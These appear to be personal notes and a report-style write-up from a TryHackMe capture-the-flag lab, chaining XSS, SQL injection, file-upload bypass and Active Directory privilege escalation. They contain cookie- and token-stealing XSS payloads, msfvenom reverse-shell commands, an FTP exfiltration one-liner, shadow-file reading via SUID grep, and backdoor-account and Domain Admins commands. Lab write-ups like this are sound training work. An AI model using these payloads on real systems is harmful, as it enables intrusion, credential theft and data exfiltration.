# Web
---
- `http://10.200.150.100/` => TryBankMe
## Unrestricted File Upload
- For uploading docs

## XSS in Description Field for loan
- `<img src=x onerror="document.cookie='XSS=XSS; path=/;'">`
- `THM{f8ce3b8b-cd1a-4254-8494-20de169c8723}`
![[Pasted image 20250830030159.png]]


```
<script>document.body.innerHTML += "<a href='http://10.250.1.5/test'>Help Please</a>"</script>
``
<img src=x onerror="fetch('http://10.250.1.6/?c='+document.cookie)">

curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "anshul6", "password" : "password" }' http://10.200.150.100:8080/api/v1.0/xss


<img src=x onerror="fetch('http://10.250.1.6/steal?token=' + localStorage.getItem('token'))">`

`
`````

## Loan Approval while creating loan
---
![[Pasted image 20250830064219.png]]
`THM{929610b9-532a-47f5-b802-99e09a984af5}`


# SQLMAP on 152 port 1200 - sequel with os-shell
-----
THM{e8230218-62ad-4159-9dde-2144e2cb9179}


PRIVESC - THM{a1f35b9f-2ee1-45bb-8248-49b00dc47f80}
----
-rw-r----- 1 mysql    www-data     0 Aug 30 12:08 tmpuzckk.php
www-data@sequel:/var/www/html$ /usr/bin/grep THM /root/root.txt
/usr/bin/grep THM /root/root.txt
THM{a1f35b9f-2ee1-45bb-8248-49b00dc47f80}
www-data@sequel:/var/www/html$ 

# Windows server - Upload evil.exe.pdf
----
- THM{dd77dd8e-29c2-4ebe-a97b-2f66aeec723a} 

- HR Account:
 ```
C:\Users\hr\Desktop>type notes.txt 
type notes.txt
Hey,

Just a heads-up before I forget � the creds for the HR account are still the default. Not ideal, I know, but I haven�t had time to rotate them yet. ??

Account: hr  
Password: TryH@cKMe9#21TryH@cKMe9#21
  
  ```
- `xfreerdp3 /v:10.200.150.151 /u:'hr' /p:'TryH@cKMe9#21TryH@cKMe9#21'`
- ![[Pasted image 20250830101539.png]]
	- AlwaysInstallElevated
- `msfvenom -p windows/x64/shell_reverse_tcp lhost=10.250.1.6 lport=4444 -f msi -o shell.msi`
- ![[Pasted image 20250830102007.png]]
- `THM{1050b997-7c7b-4dbe-a43a-6fc65dceec31}`


# AD Enum
----
10.200.150.20   WRK.TRYHACKME.LOC WRK
10.200.150.10   DC.TRYHACKME.LOC DC TRYHACKME.LOC

- Login on Port 8080 -> Tomcat Manager: 10.200.150.20  WRK.TRYHACKME.LOC
		- `tomcat`: `s3cret`
- Generate war reverse shell:
	- `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.250.1.6 LPORT=4444 -f war > evil.war`
- Get reverse shell:
	- ![[Pasted image 20250830103655.png]]
- `C:\flag.txt` => `THM{af74272d-930b-453d-be4c-11096c374dc2}`

Administrator access with `getsystem`
![[Pasted image 20250830104517.png]]

`(New-Object Net.WebClient).UploadFile('ftp://10.250.1.6/TRYHACKME.zip', 'C:\Users\svc.callback\20250830172745_TRYHACKME.zip')`

# Meterpreter shows the password for TRYHACKME\svc.callback user
- `qvBVAj9avM3ykcbf9s`
![[Pasted image 20250830135058.png]]
`THM{c585f62d-d417-4a49-8cfa-37ffbde6f182}`




        net user hacker Password1 /add
        net localgroup Administrators hacker /add
- .\SharpHound.exe -c All --zipfilename TRYHACKME
- RDP and runas svc.callback user:
	- `runas /user:"tryhackme.loc\svc.callback" powershell.exe`
- Run bloodhound to find we have generic write over Domain Admins
- Add ourselves:
	- `net group "Domain Admins" svc.callback /add /domain`
- Powershell remoting into DC:
	- `Enter-PSSession -ComputerName DC.TRYHACKME.LOC -Credential TRYHACKME.LOC\svc.callback`
	- ![[Pasted image 20250830135249.png]]
- Gain access to flag.txt with icacls:
	- ![[Pasted image 20250830135314.png]]
	- `THM{c585f62d-d417-4a49-8cfa-37ffbde6f182}`


SCORE
======
- 190 + 360 + 240


## MORE WEB
=======
- `"account_number":"a85d9f85-0b4c-4d6b-84e7-02346f31506c"` => REPLACE WITH THIS
- cbd70519-1097-4ada-a88f-1e4e16be1d14

"account_number":"0eb709a9-f202-4b5a-a1f9-1b9d58e524b3","balance":100,"nickname":"fuckup1"


bd8490a5-13e1-4fe4-b770-a0553f5f3993 


## FOUND Vulnerability in Viewing vaults of another person:
"flag":"THM{bb80df73-d797-48d7-96d3-94cbd5710578}",



anshul53333333@thm.com



```
- ****Service discovery****
    - A custom application named ****Sequel Chat**** was identified running on port `1200` of the Linux host `10.200.150.152 using nmap service scan`.
- ****SQL injection vulnerability****
    - The login form of the Sequel application was vulnerable to ****SQL Injection**** (blind and error-based).
    - SQL queries were manipulated through the POST login request, confirming lack of proper sanitization.
- ****Database extraction****
    - Using `sqlmap` against the intercepted login request, the `user` table from the Sequel database was enumerated.
    - Retrieved credentials:
    - - Username: `admin@sequel.thm`
        - Password: `zxQY7tN1iUz9EJ3l8zWezxQY7tN1iUz9EJ3l8zWe`
- ****Authentication and exploitation****
    - With valid credentials, authenticated requests were replayed and tested again through `sqlmap`.
    - Executed: `sqlmap -r request --os-shell`
    - This resulted in obtaining an ****operating system shell**** on the target server with ****low-level user privileges****.
- ****Impact****
    - The SQL injection enabled full compromise of the underlying database.
    - Chaining the vulnerability with authentication bypass led to ****remote code execution**** on the host system, granting attacker persistence and pivoting capabilities.
      
      
- ****Enumeration****
    - After initial access as a low-privileged user on linux host (10.200.150.152), executed the `linpeas.sh` enumeration script to identify potential privilege escalation vectors.
    - During the scan, we observed that the binary `/usr/bin/grep` had the ****SUID bit**** set.
    - This is unusual, as `grep` is not meant to be run with elevated privileges.
- ****Discovery****
    - Files with the SUID bit inherit the file owner’s permissions when executed.
    - Since **`**/usr/bin/grep**`** ****is owned by**** **`**root**`**, any execution of this binary allows us to perform actions with ****root privileges****.
- ****Exploitation****
    - Using the `grep` SUID binary, we can read files that should only be accessible to root.
    - For example, we successfully accessed ****sensitive files**** such : **`**/usr/bin/grep root /etc/shadow**`**
    - This revealed password hashes of all system users, including the root
- ****Impact****
    - With access to `/etc/shadow`, an attacker can perform ****offline password cracking**** to recover root credentials.
    - Additionally, depending on the environment, the attacker could directly extract other sensitive system information.
    - This exposure effectively allows privilege escalation to full ****system compromise****.
      
      
      
      
      - ****Service identification****
    - An Nmap scan revealed the CV Manager application running on both port 443 and port 8081 on windows host 10.200.150.151 .
    - The application was designed to allow HR personnel to review uploaded resumes in PDF format.
- ****File upload functionality****
    - The application enforced an upload restriction to PDF files.
    - However, the validation was found to be superficial and only checked the file extension.
- ****Bypassing file upload restrictions****
    - A malicious payload was generated using `msfvenom -p windows/x64/shell_reverse_tcp lhost=<attacker_ip> lport=443 -f exe -o evil.exe`.
    - The file was selected for upload.
- ****Intercepting request****
    - Using BurpSuite, the upload request was intercepted.
    - The filename was modified from `evil.exe` to `evil.exe.pdf` in the intercepted request.
    - This bypassed the application’s weak validation.
- ****Execution of malicious file****
    - Once uploaded, the HR user was expected to open the file as part of the business process (“the HR will open the resume no matter what happens”).
    - Upon execution, the `evil.exe.pdf` file was treated as an executable by Windows.
- ****Establishing reverse shell****
    - An attacker-controlled Netcat listener was set up: `nc -lnvp 443`.
    - When the HR opened the file, the reverse shell connected back to the listener.
    - This granted direct access to the Windows host with the privileges of the HR user.
      
      
      
      - ****Initial Access (HR User Context)****
    - Access was obtained on the windows host (10.200.150.151) under the ****HR user**** account (from last finding by getting shell from CV Manager web application).
- ****Privilege Escalation Enumeration****
    - The script ****PowerUp.ps1**** was uploaded and executed to identify local privilege escalation opportunities.
    - The script output indicated that the ****AlwaysInstallElevated**** registry keys were enabled.
- ****Abuse of AlwaysInstallElevated Policy****
    - A malicious MSI payload was generated and transferred using:  
        `msfvenom -p windows/x64/shell/reverse_tcp LHOST=<attacker_IP> LPORT=443 -f msi -o shell.msi`
    - A netcat listener was setup on the attack machine: `nc -lnvp 443`
- ****Privilege Escalation****
    - Due to the AlwaysInstallElevated policy, the MSI installer executed with ****NT AUTHORITY\SYSTEM**** privileges, resulting in full system compromise.
- ****Additional Observation****
    - A plaintext note containing the HR user’s password was found on the desktop. This was not required for the attack path but represents an additional security concern.
```